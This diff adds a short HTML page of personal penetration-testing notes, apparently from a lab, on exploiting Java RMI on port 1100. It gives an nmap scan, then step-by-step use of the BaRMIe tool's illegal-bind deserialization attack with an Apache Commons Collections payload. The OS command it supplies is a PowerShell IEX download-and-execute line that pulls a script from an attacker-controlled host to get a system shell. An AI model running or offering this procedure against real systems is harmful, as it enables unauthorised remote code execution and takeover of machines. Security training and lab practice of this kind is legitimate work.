@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>java-rmi 1099/1100</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>java-rmi 1099/1100</h1><br/>nmap -sC -sV -Pn 10.11.1.73 -p 1100 <br />    may dump the reg of the java-rmi instance. If this is the case the machine may be vulnerable to a deserializaion exploit.<br />    BaRMIe.jar is the way to go to directly exploit this vulnerability.<br />    <a href="https://github.com/NickstaDB/BaRMIe/releases/tag/v1.01">https://github.com/NickstaDB/BaRMIe/releases/tag/v1.01</a>      is where the latest build is hosted, pre-built<br />    <br />useage<br />    java -jar BaRMIe_v1.01.jar -attack 10.11.1.73 1100<br />    target select)          1<br />    available attacks)    1 (illegal bind deserialization)<br />    payloads)                1 (Apache Common Collections 3.1 worked for me, others may also work)<br />    OS Command)         powershell.exe -command &quot;IEX(new-object net.webclient).downloadstring(&#39;http://192.168.119.167:80/3232.ps1&#39;)&quot;<br />    <br />    enjoy your system shell!</div></body></html>
